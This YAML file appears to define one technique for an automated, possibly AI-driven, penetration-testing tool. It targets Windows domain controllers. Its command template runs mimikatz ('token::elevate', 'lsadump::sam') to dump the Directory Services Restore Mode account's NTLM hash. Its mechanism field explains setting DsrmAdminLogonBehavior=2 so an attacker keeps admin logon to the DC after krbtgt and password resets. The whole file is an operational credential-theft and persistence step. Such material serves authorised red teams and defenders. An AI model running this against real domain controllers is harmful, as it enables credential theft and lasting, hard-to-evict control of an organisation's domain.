name: dsrm_password
category: ad
description: DSRM admin password persistence on a DC
preconditions:
- local_system
- os==windows
- is_dc
parameters:
  target_ip: from_engagement.target_ip
command_template: mimikatz "token::elevate" "lsadump::sam"
parser: generic_parser
expected_effects:
- dsrm_admin_persistence
- local_admin_credential
- domain_persistence
falsifier:
  pattern: ACCESS_DENIED|SYSKEY|denied|not a domain controller
  timeout: 30
model_tier: sonnet
mechanism: 'DCs hold a Directory Services Restore Mode account in the local SAM hive
  with its

  own NTLM hash. Set DsrmAdminLogonBehavior=2 in the registry then RDP/PsExec to the
  DC

  as DSRM admin even after krbtgt rotation. Persistence that survives password resets.

  '
references:
  ocd_mindmap: 'Branch 13: DSRM password (NTDS local admin)'
  hacktricks: windows-hardening/active-directory-methodology/dsrm-credentials.md
hacktricks_ref: windows-hardening/active-directory-methodology/README.md
